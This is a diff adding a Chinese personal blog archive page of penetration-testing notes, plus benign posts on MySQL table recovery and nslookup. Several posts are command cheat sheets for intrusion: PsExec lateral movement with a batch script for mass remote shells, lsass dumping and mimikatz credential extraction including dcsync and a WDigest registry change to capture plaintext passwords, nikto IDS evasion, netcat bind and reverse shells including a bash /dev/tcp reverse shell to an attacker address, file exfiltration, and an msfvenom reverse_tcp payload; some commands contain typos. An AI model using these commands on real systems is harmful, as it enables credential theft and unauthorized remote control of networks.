@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>空空</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="好记性不如烂笔头，主要用于工作，学习中的随手记录">
+<meta property="og:type" content="website">
+<meta property="og:title" content="空空">
+<meta property="og:url" content="http://example.com/page/3/index.html">
+<meta property="og:site_name" content="空空">
+<meta property="og:description" content="好记性不如烂笔头，主要用于工作，学习中的随手记录">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="两袖空空">
+<meta property="article:tag" content="笔记 , 研究 , 漏洞">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="空空" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">空空</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">两袖空空的随手记</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-PsExec" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/PsExec/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T15:12:29.032Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>简介<br>    PsExec 是由 Mark Russinovich 创建的 Sysinternals Suite中包含的工具。<br>    最初作为系统管理员的便利工具，以便在远程主机上运行命令来执行维护任务。后来因为太过方便，被利用到内网渗透之中。<br>    现在PsExec类的工具有各种语言的实现，如Metasploit的psexec psexec psh, Impacket psexec, pth-winexe, Empire Invoke-Psexec等等。<br>    可以获得与命令控制台几乎相同的实时交互性。<br>    PsExec最强大的功能就是在远程系统和远程支持工具（如ipconfig、whoami）中启动交互式命令提示窗口，以便显示无法通过其他方式显示的有关远程系统的信息。<br>    属于合法工具，有可以避反病毒软件和终端检测等产品</p>
+<p>原理：<br>    需要远程计算机启用文件和打印共享且默认Admin$共享映射到C:windows 目录<br>    PsExec建立连接后，目标机器会安装一个 “PSEXESVC” 服务，但是PsExec退出后该服务会删除（cmd下exit 退出） </p>
+<p>运行过程<br>    TCP三次握手，通过445端口SMB服务进行身份验证<br>    连接admin$默认共享，写入PSEXESVC.exe服务文件<br>    利用IPC命名管道调用svcctl服务，从而开启PSEXESVC服务<br>    生成四个命名管道以使用，1、psexesvc 2、输入管道 sdtin  3、输出管道stdout 4、重定向进程stderr</p>
+<p>不足：<br>    会释放文件，易被检测溯源攻击过程<br>    安装服务，留下日志<br>    少有的情况 退出时，服务删除失败<br>    推荐使用wmiexec</p>
+<p>定位域控<br>    net view &#x2F;domain 查看域<br>    net view &#x2F;domain:test 域内主机<br>    ping dc<br>    nslookup dc<br>查看当前登录域<br>    net config workstation<br>查看当前域的密码策略<br>    net accounts &#x2F;domain<br>查看补丁信息<br>    wmic qfe<br>查看当前系统信息<br>    wmic os</p>
+<p>无ipc连接时，我们需要进行身份验证<br>    PsExec.exe \192.168.1.1 -u administrtor -p 123456 cmd.exe		远程启用账户权限的cmd<br>    PsExec.exe \192.168.1.1 -u administrtor -p 123456  -s cmd.exe  远程启用System权限的cmd，需要administrator权限的shell<br>    PsExec.exe \192.168.1.1 -u administrtor -p 123456 cmd &#x2F;c “ipconfig”		远程启用cmd执行ipconfig并回显 </p>
+<p>PsExec参数<br>    # -accepteula  第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框<br>    # -s      以System权限运行远程进程，获得一个System权限的交互式Shell，如果不用这个参数，那么会获得一个administrator权限的shell<br>    # -h 如果可以，以管理员权限运行远程进程<br>    # -d 不等待程序执行完就返回，请只对非交互式应用程序使用此选项<br>UAC认证弹窗<br>    HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem添加新DWORD值，键值：LocalAccountTokenFilterPolicy 为1<br>    修改注册表容易引起告警，一般不建议</p>
+<p>有ipc连接时<br>    net use \192.168.1.1\ipc$  &#x2F;user:”administrator” “123456”<br>    PsExec.exe \192.168.1.1 cmd.exe		远程启用cmd</p>
+<p>MSF IPC利用<br>    search psexec<br>    exploit&#x2F;windows&#x2F;smb&#x2F;psexec<br>    exploit&#x2F;windows&#x2F;smb&#x2F;psexec_psh（Powershell 版本的 psexec,是 powershell 版本的payload）<br>    use exploit&#x2F;windows&#x2F;smb&#x2F;psexec<br>    set RHOST 192.168.1.1<br>    set smbuser usernmae<br>    set smbpass password<br>    run</p>
+<p>批量<br>@echo off<br>echo check ip addr config file…<br>if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end<br>echo read and analysis file…<br>for &#x2F;F “eol&#x3D;#” %%i in (ip.txt) do start PsExec.exe \%%i -accepteula -u administrator -p “123456” cmd &amp; start cmd &#x2F;c PsExec.exe \%%i -u administrator -p “123456” cmd<br>:end<br>exit</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/PsExec/" data-id="clcoy0fgg000sd4vp0av6dnma" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-procdump" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/procdump/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T15:12:29.017Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>procdump远程获取dmp<br>    procdump -accepteula  -ma lsass.exe lsass.dmp</p>
+<p>copy lsass.dmp 回本地</p>
+<p>mimikatz 本地读明文<br>    mimikatz.exe “sekurlsa::minidump info_10.130.dmp” “sekurlsa::logonPasswords full” exit &gt; 10.130hash.txt<br>    mimikatz.exe “sekurlsa::minidump lsass10.192.dmp” “sekurlsa::logonpasswords full” exit &gt;lsass10.192.txt<br>    报错：error kuh1_m_sekurlsa_acquireLSA:logon list<br>    遇到这个报错，是 Mimikatz 版本太低</p>
+<p>获取明文的方法<br>    mimikatz<br>        &#x2F;&#x2F;导出sam.hiv和sam.hiv文件（CMD运行）<br>        reg save HKLM\SYSTEM Sys.hiv<br>        reg save HKLM\SAM Sam.hiv</p>
+<pre><code>通过 Mimikatz 加载 sam.hiv 和 sam.hiv 来导出 Hash；
+    mimikatz.exe &quot;lsadump::sam /sam:Sam.hiv /system:Sys.hiv &quot; exit&gt; pwd.txt
+    
+在域控上执行)查看域kevin.com内指定用户root的详细信息，包括NTLM哈希等
+    lsadump::dcsync /domain:kevin.com /user:root
+
+(在域控上执行)读取所有域用户的哈希
+    lsadump::lsa /patch
+
+从sam.hive和system.hive文件中获得NTLM Hash
+    lsadump::sam /sam:sam.hive /system:system.hive
+
+从本地SAM文件中读取密码哈希
+    token::elevate
+    lsadump::sam
+</code></pre>
+<p>特殊情况：<br>    Windows10&#x2F;2012R2 版本：<br>    默认 Windows10 或者 2012R2 以上的，禁止在内存缓存中保存明文密码。<br>    1、修改注册表<br>            修改注册表来让 Wdigest Auth 保存明文口令：<br>            复原把 1 改为 0<br>            reg add HKLM\SYSTEM\CurrentControlSet\ControlSecurity\Providers\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br>    2、锁屏或者退出账号<br>            修改注册表需要重启，或者注销账号重新登录。<br>    3、等待目标系统管理员重新登录<br>    4、重新读取密码</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/procdump/" data-id="clcoy0fiz0013d4vp2ureahmz" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-nslookup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/nslookup/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T15:12:28.966Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>域名解析记录在线查询工具<br><a target="_blank" rel="noopener" href="http://www.jsons.cn/nslookup/">http://www.jsons.cn/nslookup/</a><br>    nslookup 可以指定查询的类型，可以查到DNS记录的生存时间还可以指定使用那个DNS服务器进行解释<br>    开始–运行—输入CMD–回车 nslookup的语法为 nslookup –qt&#x3D;类型 目标域名(注意qt必须小写)<br>    类型主要有:<br>    A 地址记录(Ipv4)<br>    AAAA 地址记录（Ipv6）<br>    CNAME 别名记录<br>    HINFO 硬件配置记录，包括CPU、操作系统信息<br>    ISDN 域名对应的ISDN号码<br>    MB 存放指定邮箱的服务器<br>    MG 邮件组记录<br>    MINFO 邮件组和邮箱的信息记录<br>    MR 改名的邮箱记录<br>    MX 邮件服务器记录<br>    NS 名字服务器记录<br>    PTR 反向记录<br>    RP 负责人记录<br>    SRV TCP服务器信息记录<br>    TXT 域名对应的文本信息<br>    使用指定DNS服务器查询<br>    语法为 nslookup -qt&#x3D;类型 目标域名 指定的DNS服务器IP或域名<br>    如果你要查询<a href="http://www.jsons.cn的A记录,那在命令符提示窗口输入：nslookup">www.jsons.cn的A记录,那在命令符提示窗口输入：nslookup</a> -qt&#x3D;a <a target="_blank" rel="noopener" href="http://www.jsons.cn的/">www.jsons.cn的</a> 则可以查到相应的记录<br>    例子：nslookup -qt&#x3D;A <a target="_blank" rel="noopener" href="http://www.jsons.cn的/">www.jsons.cn的</a> 8.8.8.8</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/nslookup/" data-id="clcoy0fhe000xd4vp6epq9ock" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-nikto" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/nikto/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T15:12:28.964Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Nikto简介<br>基于perl语言开发的web页面扫描器。其特点扫描全面，速度快。</p>
+<p>nikto常用命令<br>    -upodate                         升级，更新插件<br>    -host                               扫描目标URl<br>    -id username:password  http认证接口<br>    -list-plugins                     列出所有可用的插件<br>    -evasion                          IDS&#x2F;IPS逃避技术（实例演示里有详细信息）<br>    -port                                指定端口（默认80）<br>     -ssl                                 使用SSL<br>    -useproxy                       使用http代理<br>    -vhost  域名                    当一个IP拥有多个网站时 使用</p>
+<p>nikto交互参数（扫描过程中使用）<br>    空格        报告当前扫描状态<br>    v             显示详细信息<br>    d             显示调试信息<br>    e             显示http错误信息<br>    p             显示扫描进度<br>    r              显示重定向信息<br>    c             显示cookie<br>    a             显示身份认证过程<br>    q             退出程序<br>    N            扫描下一个目标<br>    P            暂停扫描<br>实例演示<br>    1.扫描单个地址时<br>        nikto   -host  <a target="_blank" rel="noopener" href="http://192.168.0.3/">http://192.168.3</a><br>    2.扫描多个地址时<br>        nikto  -host   url.txt</p>
+<pre><code>3.扫描https网站
+
+    nikto   -host   www.baidu.com   -ssl   -port 443
+
+4.使用代理进行扫描
+
+    nikto   -host  https://www.baidu.com -ssl   -useproxy  http;//127.0.0.1:8080
+
+5.使用LibWhisker绕过IDS的检测（10个参数 1-8、A、B）
+
+          1 随机URI编码（非utf-8）
+
+          2 自选择路径（/. /）
+
+          3 过早结束的URL
+
+          4 使用长随机字符串
+
+          5 使用假参数
+
+          6 使用tab作为命令的分隔符
+
+          7 更改URL的大小写
+
+          8 使用windows的命令分隔符&quot;\&quot;
+
+          A 使用回车0x0d作为请请求分隔符
+
+          B 使用二进制0x0b作为请请求分隔符      
+
+niketo -host www.baidu.com -ssl  -port 443    -evasion 1358
+</code></pre>
+<p>修改配置信息<br>1.将user-agent:nikto改为其他浏览器标识，避免被识别出来。</p>
+<p> vi &#x2F;etc&#x2F;nikto.conf</p>
+<p>2.如果是基于表单的认证，必须要使用cookie，将原来的cookie注释，按照原来的格式写入你的cookie。</p>
+<p>STATIC-COOKIE &#x3D; “cooke1&#x3D;cookie value1”; “cookie2&#x3D;value2”； </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/nikto/" data-id="clcoy0feo000qd4vp2ttb9agw" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-nc" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/nc/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T15:12:28.947Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>nc<br>参数<br>    -c  shell commands<br>    -d  后台模式<br>    -e	程序重定向<br>    -i  时间间隔<br>    -l  监听模式<br>    -n  直接使用IP地址，不通过域名服务器<br>    -o 文件名	将传输的数据转化为十六进制字节码后存于文件中<br>    -p  设置通信端口<br>    -r  随机指定本地与远程主机的通信端口<br>    -s IP地址  设置本机送出的数据包的的ip地址<br>    -u	使用udp协议<br>    -v	详细输出<br>    -w  设置等待连接时间<br>    -z  输入输出功能关闭，只在扫描端口时使用</p>
+<p>banner 抓取<br>    nc -nv	10.10.80.107 22</p>
+<p>连接远程主机<br>    attck<br>        nc -nvv 10.10.80.107 4444</p>
+<p>端口扫描<br>    nc -v 10.10.80.107 80<br>    nc -v -z 10.10.80.107 80 (很慢)</p>
+<p>端口监听<br>    nc -l -p 8888  （会输出访问该端口的信息）</p>
+<p>文件输出<br>    attck<br>        nc -lp 4444	&gt;1.txt<br>    target<br>        nc -vn 10.10.80.102 4444 &lt; test.txt -q 1<br>        在目标机中输入该命令 会与VPS 4444端口进行通信，传输一个为test.txt的文本文件到vps上</p>
+<p>简易聊天<br>    attck<br>        nc -l -p 4444<br>    target<br>        nc -vn 10.10.80.102 4444</p>
+<p>获取shell<br>    客户端连接服务器，客户端想获取服务器的shell 称之为正向shell<br>    客户端连接服务器，服务器想获取客户端的shell 称之为反向shell</p>
+<pre><code>target
+    nc -lvp 4444 -e /bin/sh  #Linux
+    nc -lvp 4444 -e C:\windows\system32\cmd.exe		#windows
+attck
+    nc 10.10.80.107 4444
+
+反向shell
+target
+    nc -lvp 10.10.80.102 4444 -e /bin/sh  #Linux
+    nc -lvp 10.10.80.102 4444 -e C:\windows\system32\cmd.exe  #windows
+attck
+    nc -lvp 4444
+</code></pre>
+<p>目标机没有nc时 获取反向shell<br>    attck<br>        nc -lvp 4444<br>    target<br>        1、通过python 建立反向shell连接<br>        2、通过Bash 建立反向shell连接<br>            bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.80.102&#x2F;4444 0&gt;&amp;1<br>        3、通过PHP建立反向shell连接<br>        4、通过perl 建立反向shell连接</p>
+<p>nc做中转shell<br>    attck	80.102<br>        nc -lvp 4444<br>    target2  1.103<br>        nc -lvp 5555 -e &#x2F;bin&#x2F;sh<br>    target1  80.107  1.107<br>        nc -v 10.10.80.102 4444 -c “nc -v 192.168.1.103 5555”</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/nc/" data-id="clcoy0fgs000vd4vp1gsyfnzd" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-nbtscan" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/nbtscan/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T15:12:28.913Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>nbtscan<br>    一个在本地或远程TCP&#x2F;IP网络上扫描开放的NETBIOS名称服务器的命令行工具。<br>    它基于Windows系统的nbtstat工具的功能实现，但它可在许多地址上运行，而不是仅一个地址。<br>用法: nbtscan-unixwiz [选项] 目标 [目标…]</p>
+<p>   目标可以是IP地址，DNS名称或地址的列表范围。<br>   范围可以表示成“192.168.12.0&#x2F;24”或“192.168.12.64-97”<br>   -V	显示版本信息<br>   -f	显示完整的NBT资源记录响应(推荐)<br>   -H	生成HTTP请求头<br>   -v	开启详细输出调试<br>   -n	不查找响应IP地址的反向名称<br>   -p <n>    绑定UDP端口(默认0)<br>   -m	响应中包含MAC地址 (等同’-f’)<br>   -T <n>	超时不响应 (默认2秒)<br>   -w <n>	次写入后等待秒数 (默认10ms)<br>   -t <n>	每个地址尝试次数(默认1次)<br>   -P	以perl的hashref格式生成结果</p>
+<p>一：扫描整个C段：<br>    扫描参数：nbtscan -r 目标&#x2F;24</p>
+<p>二：扫描一个范围：<br>    扫描参数：nbtscan 目标（起始）-目标（结尾）</p>
+<p>三：以：分割显示结果：</p>
+<pre><code>扫描参数：nbtscan -v -s ：目标
+</code></pre>
+<p>四：扫描文件里的目标范围：<br>    扫描参数：nbtscan -f 文件名</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/nbtscan/" data-id="clcoy0fg0000rd4vp3xxx1ko1" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-mysql" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/mysql/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T15:12:28.898Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>一、mysql 有两种存储引擎<br>    1、mysql 数据库<br>    存储引擎是myisam, 在data目录下会看到3类文件：.frm、.myi、.myd<br>        (1).frm–表定义，是描述表结构的文件。<br>        (2).MYD–”D”数据信息文件，是表的数据文件。<br>        (3)*.MYI–”I”索引信息文件，是表数据文件中任何索引的数据树</p>
+<pre><code>2、存储引擎是InnoDB, 在data目录下会看到2类文件：.frm、.ibd
+(1).frm–表结构的文件
+        MYSQL中建立任何一张数据表，在其数据目录对应的数据库目录下都有对应表的.frm文件
+        .frm文件是用来保存每个数据表的元数据(meta)信息，包括表结构的定义等
+        .frm文件跟数据库存储引擎无关，也就是任何存储引擎的数据表都必须有.frm文件
+        命名方式为数据表名.frm，如user.frm. .frm文件可以用来在数据库崩溃时恢复表结构。
+(2).ibd–表数据和索引的文件。该表的索引(B+树)的每个非叶子节点存储索引，叶子节点存储索引和索引对应的数据。
+
+    
+</code></pre>
+<p>二、恢复方法<br>首先恢复表结构<br>    1、基于MyISAM 表结构恢复<br>        假定需要恢复的表的FRM文件为test_myisam.frm,表结构为<br>        mysql&gt; create table test_myisam<br>            -&gt; (A int(11) default NULL,<br>            -&gt; B varchar(30) default NULL,<br>            -&gt; C date default NULL) engine&#x3D;myisam;<br>        Query OK, 0 rows affected (0.05 sec)<br>        步骤一：<br>            直接将test_myisam.frm 文件考到正常数据库对应目录下测试<br>            mysql&gt; show tables;<br>            +————–+<br>            | Tables_in_aa |<br>            +————–+<br>            | test_innodb |<br>            | test_myisam |<br>            +————–+<br>            3 rows in set (0.00 sec)<br>            mysql&gt; desc test_myisam;<br>            ERROR 1017 (HY000): Can’t find file: ‘test_myisam’ (errno: 2)<br>            注：发现只能通过show tables 命令看见表名，desc报错，说明表结构没有恢复<br>        步骤二：<br>            新建test_myisam.MYD 和test_myisamMYI文件 内容可以为空<br>            在MYSQL命令行使用MYSQL本身的数据表恢复命令repair命令恢复表，如下：<br>            mysql&gt; repair table test_myisam USE_FRM;<br>            +—————–+——–+———-+———-+<br>            | Table          | Op    | Msg_type | Msg_text |<br>            +—————–+——–+———-+———-+<br>            | aa.test_myisam | repair | status   | OK      |<br>            +—————–+——–+———-+———-+<br>            1 row in set (0.00 sec)<br>            根据结果可以知道,恢复命令执行成功，下边用desc命令测试下（用show create table命令测试）：<br>            mysql&gt; desc test_myisam;<br>            +——-+————-+——+—–+———+——-+<br>            | Field | Type        | Null | Key | Default | Extra |<br>            +——-+————-+——+—–+———+——-+<br>            | A    | int(11)    | YES  |    | NULL    |      |<br>            | B    | varchar(30) | YES  |    | NULL    |      |<br>            | C    | date        | YES  |    | NULL    |      |<br>            +——-+————-+——+—–+———+——-+<br>            3 rows in set (0.02 sec)<br>            恢复成功</p>
+<pre><code>2、基于InnoDB表结构的恢复
+    假定该文件为test_innodb.frm.
+    该表创建脚本如下：
+        mysql&gt; create table test_innodb
+        -&gt; (A int(11) default NULL,
+        -&gt; B varchar(30) default NULL,
+        -&gt; C date default NULL) engine=innodb;
+        Query OK, 0 rows affected (0.05 sec)
+    步骤一：
+        在新MYSQL环境下建立数据库 如 aa
+    步骤二：
+        在aa数据库下建立同名数据库表。结构随意，目前只有一个id字段。但是表名和之前对应
+        如：mysql&gt; create table test_innodb (id bigint not null)engine=InnoDB;
+        Query OK, 0 rows affected (0.09 sec)
+        mysql&gt; show tables;
+        +--------------+
+        | Tables_in_aa |
+        +--------------+
+        | test_innodb |
+        +--------------+
+        2 rows in set (0.00 sec)
+
+        mysql&gt; desc test_innodb;
+        +-------+------------+------+-----+---------+-------+
+        | Field | Type      | Null | Key | Default | Extra |
+        +-------+------------+------+-----+---------+-------+
+        | id    | bigint(20) | NO  |    | NULL    |      |
+        +-------+------------+------+-----+---------+-------+
+        1 row in set (0.00 sec)
+    步骤三：
+        停止mysql服务，将损毁后备份的.frm文件copy 到aa目录下，覆盖同名的frm文件
+        重启mysql服务
+        mysql&gt; desc test_innodb;
+        +-------+-------------+------+-----+---------+-------+
+        | Field | Type        | Null | Key | Default | Extra |
+        +-------+-------------+------+-----+---------+-------+
+        | A    | int(11)    | YES  |    | NULL    |      |
+        | B    | varchar(30) | YES  |    | NULL    |      |
+        | C    | date        | YES  |    | NULL    |      |
+        +-------+-------------+------+-----+---------+-------+
+        3 rows in set (0.01 sec)
+    成功恢复
+</code></pre>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.sina.com.cn/s/blog_5d3da3280100hymn.html%EF%BC%88%E6%81%A2%E5%A4%8D%E8%A1%A8%E7%BB%93%E6%9E%84%EF%BC%89">https://blog.sina.com.cn/s/blog_5d3da3280100hymn.html（恢复表结构）</a></p>
+<p>三、恢复表数据<br>    1、将新建的表DISCARD掉<br>    命令行执行：<br>        ALTER TABLE table1 DISCARD TABLESPACE;<br>    2、将备份的源表数据文件.ibd拷贝过来<br>    将.ibd文件放到新数据库的data目录下，覆盖刚创建表时新生成的.ibd文件</p>
+<pre><code>即/usr/local/mysql/data/db1/下
+3、将拷贝过来的.ibd表数据导入进来
+    ALTER TABLE  `table1` IMPORT TABLESPACE;
+ 
+</code></pre>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.chriscalender.com/recovering-an-innodb-table-from-only-an-ibd-file/">https://www.chriscalender.com/recovering-an-innodb-table-from-only-an-ibd-file/</a><br>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/meitian/p/9886654.html">https://www.cnblogs.com/meitian/p/9886654.html</a> （恢复数据）<br>此方法恢复数据的前提：建表用的innodb索引</p>
+<p>备注：如果mysql的目录还都在，可以先尝试，将mysql下的目录都拷贝到一个新mysql目录下，启动看看能不能用，不能用后再尝试下面方法</p>
+<p>mysql会有一个data目录存储表结构和表数据。下面的目录结构大概如下：<br>ib_logfile0<br>ib_logfile1<br>ibdata1<br>ibtmp1<br>xx数据库1<br>xx数据库2</p>
+<p>每个数据库目录下面的表内容如下：<br>表1.frm<br>表1.ibd<br>表2.frm<br>表2.ibd<br>.frm文件：表结构文件<br>.ibd文件：表数据文件</p>
+<p>下面为恢复数据方法<br>备注：这里假设要备注的库名为db1，表名为table1<br>1、先备份要恢复数据的表文件<br>table1.frm和table1.ibd文件</p>
+<p>可以直接把原数据库的data目录整个拷贝过来，如果指定了data目录可以通过查看mysql的进程看到具体配置位置<br>2、新搭建一个mysql<br>我用的5.7，搭建在mac本地<br>3、将mysql下的log文件删除，不要保留和要备份的库相同的内容<br>如果你是完全新建的一个数据库，和原来的库表完全无关，可以忽略这步骤</p>
+<p>rm -rf &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;ib_logfile0<br>rm -rf &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;ib_logfile1<br>rm -rf &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;ibdata1<br>rm -rf &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;btmp1<br>rm -rf &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;db1<br>4、新建数据库<br>链接上mysql命令行<br>create database db1;</p>
+<p>5、通过命令行新建原来的表，<br>注意，一定在建表命令后加【ROW_FORMAT&#x3D;COMPACT】防止冲突</p>
+<p>例如：</p>
+<p>DROP TABLE IF EXISTS <code>table1</code>;<br>CREATE TABLE <code>table1</code> (<br>  <code>name</code> varchar(200) NOT NULL DEFAULT ‘’ COMMENT ‘key值’,<br>  <code>value</code> varchar(500) DEFAULT NULL COMMENT ‘value值’,<br>  <code>desc</code> varchar(500) DEFAULT NULL COMMENT ‘关于当前key的描述信息’,<br>  PRIMARY KEY (<code>name</code>)<br>) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8 ROW_FORMAT&#x3D;COMPACT;</p>
+<p>如果不记得表结构了，可以先参考下面的文章找回表结构，dump出sql结构后获得创建表的语句：<br><a target="_blank" rel="noopener" href="http://blog.sina.com.cn/s/blog_5d3da3280100hymn.html">http://blog.sina.com.cn/s/blog_5d3da3280100hymn.html</a><br>6、将新建的表DISCARD掉<br>命令行执行：<br>ALTER TABLE table1 DISCARD TABLESPACE;<br>7、将备份的源表数据文件.ibd拷贝过来<br>将.ibd文件放到新数据库的data目录下，覆盖刚创建表时新生成的.ibd文件</p>
+<p>即&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data&#x2F;db1&#x2F;下<br>8、将拷贝过来的.ibd表数据导入进来<br>ALTER TABLE  <code>table1</code> IMPORT TABLESPACE;</p>
+<p>数据成功恢复</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/01/09/mysql/" data-id="clcoy0fcw000nd4vp55qi20gl" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-msfvenom" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/01/09/msfvenom/" class="article-date">
+  <time class="dt-published" datetime="2023-01-09T15:12:28.883Z" itemprop="datePublished">2023-01-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>MsfVenom-Metasploit独立有效载荷发生器。</p>
+<p>也是msfpayload和msfencode的替代品。</p>
+<p>用法：&#x2F;opt&#x2F;metasploit-framework&#x2F;bin&#x2F;..&#x2F;embedded&#x2F;framework&#x2F;msfvenom[options]&lt;var&#x3D;val&gt;</p>
+<p>示例：&#x2F;opt&#x2F;metasploit-framework&#x2F;bin&#x2F;..&#x2F;embedded&#x2F;framework&#x2F;msfvenom-p windows&#x2F;meterepertr&#x2F;reverse_tcp LHOST&#x3D;<IP>-f exe-o payload.exe<br>示例：msfvenom-p windows&#x2F;meterepertr&#x2F;reverse_tcp LHOST&#x3D;<IP>-f exe -o payload.exe</p>
